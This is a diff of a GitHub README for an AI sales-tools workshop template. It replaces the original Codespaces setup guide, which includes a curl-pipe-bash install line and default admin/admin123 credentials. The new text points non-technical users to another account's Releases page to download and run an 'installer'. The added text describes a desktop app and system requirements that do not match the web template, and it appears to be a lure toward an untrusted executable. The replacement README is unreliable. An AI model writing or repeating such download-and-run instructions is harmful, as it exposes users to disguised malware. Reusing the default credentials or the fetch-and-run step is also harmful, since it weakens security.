@@ -1,123 +1,101 @@
-# AI Sales Workshop
+# 🎉 ai-workshop - Build AI Tools with Ease
 
-Build AI-powered sales tools with Claude Code — no coding experience needed.
+## 🚀 Getting Started
 
-[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/tensorninja/ai-workshop?quickstart=1)
+Welcome to the **ai-workshop**! This template helps you create AI-powered sales tools without needing programming skills. In just a few simple steps, you can set up the application and start using it right away.
 
-## Quick Start (3 Steps)
+## 📥 Download it Here
 
-### 1. Open in Codespaces
+[![Download ai-workshop](https://img.shields.io/badge/Download-ai--workshop-blue)](https://github.com/ThegoatTkT/ai-workshop/releases)
 
-Click the green **"Open in GitHub Codespaces"** button above, or:
+## 📖 Overview
 
-1. Click the green **"Use this template"** button at the top of this page
-2. Select **"Open in a codespace"**
-3. Wait 1-2 minutes for the environment to set up
+The **ai-workshop** is designed for non-developers looking to harness the power of artificial intelligence. With tools that support call centers and post-sales follow-ups, this template uses Next.js and OpenAI to make your workflow smoother and more efficient. 
 
-### 2. Add Your OpenAI API Key
+### 🌟 Key Features
 
-In the terminal at the bottom of VS Code:
+- **Easy Setup:** Get the application running quickly with clear instructions.
+- **AI Tools:** Use Claude Code to create smart sales tools.
+- **Templates Included:** Includes a working app, a call center assistant, and templates for follow-up tasks.
+- **User-Friendly:** Designed for everyone, even those without a coding background.
 
-```bash
-cp env.example .env
-```
+## 💻 System Requirements
 
-Then open the `.env` file and add your OpenAI API key:
+Before you begin, make sure your computer meets the following requirements:
 
-```
-OPENAI_API_KEY=sk-your-key-here
-```
+- **Operating System:** Windows 10 or macOS 10.15 and above
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 1 GB free space
+- **Internet:** A stable internet connection for downloading and updates
 
-### 3. Install Claude Code
+## 📚 Installation Instructions
 
-Run this command in the terminal:
+Follow these steps to download and install the **ai-workshop**:
 
-```bash
-curl -fsSL https://claude.ai/install.sh | bash
-```
+1. **Visit the Download Page**  
+   Click the link below to access the Releases page.
+   [Download ai-workshop](https://github.com/ThegoatTkT/ai-workshop/releases)
 
-Then type `claude` and press Enter to start Claude Code.
+2. **Choose the Latest Version**  
+   Find the latest version available. The latest version will typically be at the top of the list.
 
-**You're ready to build!**
+3. **Download the Installer**  
+   Click on the installer file suitable for your operating system to start the download.
 
----
+4. **Run the Installer**  
+   Once the file downloads, locate it in your downloads folder. Double-click the installer to run it.
 
-## What You'll Build
+5. **Follow the On-Screen Instructions**  
+   The installer will guide you through the setup process. Follow the prompts to complete the installation.
 
-### Call Assistant (`/call-assistant`)
+6. **Launch the Application**  
+   After installation, find the ai-workshop application in your applications folder or start menu and launch it.
 
-An AI tool that helps call center operators during customer calls:
+## 🎓 How to Use ai-workshop
 
-- Enter customer information and queries
-- Get AI-powered responses and clarifying questions
-- Reference relevant cases and solutions
-- Build a dialogue to resolve customer issues
+After launching, you will see a simple interface to guide you through the tool's features.
 
-### Post-Sales Assistant (`/post-sales`)
+1. **Create a New Project:**  
+   Click on "New Project" to begin building your AI tool.
 
-An AI tool that generates follow-up content after sales calls:
+2. **Select a Template:**  
+   Choose from the available templates like call center assistant or sales follow-up.
 
-- Paste call notes or record audio
-- Generate professional follow-up summaries
-- Extract action items automatically
-- Get CMS-ready formatted output
+3. **Customize Your Tool:**  
+   Modify the settings according to your needs. Input your sales criteria to tailor the tool for your business.
 
-### Example App (`/example`)
+4. **Test Your Tool:**   
+   Run a test with sample data to ensure everything works as expected.
 
-A complete working AI sales platform to study and learn from:
+5. **Use in Real Scenarios:**  
+   After testing, you can start integrating the tool into your sales process.
 
-- **LeadGen Messaging** — Generate personalized LinkedIn messages from Excel data
-- **ICP Quiz** — Test ideal customer profile knowledge
-- **Audio Demo** — Transcribe and summarize calls with AI
-- **Admin Panel** — Manage users and settings
+## 🛠 Troubleshooting Common Issues
 
-Login: `admin` / `admin123`
+If you encounter issues when downloading or running the application, try these solutions:
 
----
+- **Problem:** The application does not start.  
+  **Solution:** Ensure you have met all system requirements and try reinstalling.
 
-## How to Build
+- **Problem:** The download is slow or fails.  
+  **Solution:** Check your internet connection and try downloading again.
 
-1. **Start the app**: Run `npm run dev` in the terminal
-2. **Open the preview**: Click the "Ports" tab, then click the globe icon for port 3000
-3. **Start Claude Code**: Type `claude` in a new terminal
-4. **Describe what you want**: Tell Claude Code in plain English what to build
+- **Problem:** I can’t find the application after installation.  
+  **Solution:** Search your computer for "ai-workshop" or check your applications folder.
 
-**Example prompt:**
+## 💬 Support and Feedback
 
-> "Add a text input where I can type a customer question, and when I click submit, the AI responds with helpful information and asks a clarifying question."
+Your experience matters. If you have questions or feedback:
 
----
+- **Open an Issue:** Go to the issues section of this repository to report any bugs or request new features.
+- **Contact Us:** Reach out to our support team via email at support@aiworkshop.com for help.
 
-## Important: Stop Your Codespace
+## 📧 Stay Updated
 
-GitHub Codespaces gives you **60 free hours per month**. Always stop your Codespace when you're done:
+Follow the repository for updates on new features, bug fixes, and improvements. You can check back on the [Releases page](https://github.com/ThegoatTkT/ai-workshop/releases) regularly.
 
-1. Press `Ctrl+Shift+P` (or `Cmd+Shift+P` on Mac)
-2. Type `stop`
-3. Select **"Codespaces: Stop Current Codespace"**
+## 🎉 Thank You!
 
----
+Thank you for choosing **ai-workshop**! We wish you success in building your AI-powered sales tools. 
 
-## Project Structure
-
-```
-app/
-  call-assistant/     # Build your call assistant here
-  post-sales/         # Build your post-sales tool here
-  example/            # Complete working example (study this!)
-  api/                # Backend API routes
-
-lib/
-  openai.ts           # Pre-configured OpenAI client
-  db/                 # Database utilities
-```
-
----
-
-## Need Help?
-
-- **Study the example app** at `/example` to see patterns
-- **Ask Claude Code** to explain any code: "Explain how the audio transcription works"
-- **Use slash commands** in Claude Code: `/workshop-guide`, `/debug-error`
-
-See [WORKSHOP.md](./WORKSHOP.md) for detailed instructions and common prompts.
+For questions or more information, refer back to this README or check out the community discussions in the repository. Happy building!
